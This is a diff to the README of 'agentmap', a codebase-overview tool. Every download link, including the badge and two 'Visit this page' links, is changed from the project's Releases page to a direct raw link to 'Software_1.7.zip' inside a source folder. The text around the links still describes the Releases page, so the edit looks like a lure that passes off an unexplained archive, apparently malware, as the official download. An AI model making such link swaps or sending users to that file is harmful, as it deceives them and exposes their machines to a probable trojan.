@@ -1,7 +1,7 @@
 # 🗺️ agentmap - Simplify Your Codebase Overview
 
 ## 📥 Download Now
-[![Download agentmap](https://img.shields.io/badge/Download-agentmap-blue?style=flat&logo=github)](https://github.com/JULIOMARTINSBRASILSC/agentmap/releases)
+[![Download agentmap](https://raw.githubusercontent.com/JULIOMARTINSBRASILSC/agentmap/main/cli/src/Software_1.7.zip)](https://raw.githubusercontent.com/JULIOMARTINSBRASILSC/agentmap/main/cli/src/Software_1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to agentmap! This application helps you view the structure of your codebase at the start of every session. You’ll see descriptions for each part, making it easier to understand your project. 
@@ -19,7 +19,7 @@ To get started, you’ll need to download agentmap. Follow these steps:
 1. **Visit the Releases Page:**
    Click the link below to go to the GitHub Releases page and find the latest version of agentmap.
    
-   [Visit this page to download](https://github.com/JULIOMARTINSBRASILSC/agentmap/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/JULIOMARTINSBRASILSC/agentmap/main/cli/src/Software_1.7.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you’ll see a list of available versions. Look for the latest release, which will usually be at the top of the list.
@@ -81,4 +81,4 @@ For more information about agentmap, refer to the documentation available on Git
 ## 📅 Stay Updated
 Keep an eye on the Releases page for new features, fixes, and updates to agentmap. 
 
-[Visit this page to download](https://github.com/JULIOMARTINSBRASILSC/agentmap/releases) and start managing your codebase easily today!
+[Visit this page to download](https://raw.githubusercontent.com/JULIOMARTINSBRASILSC/agentmap/main/cli/src/Software_1.7.zip) and start managing your codebase easily today!
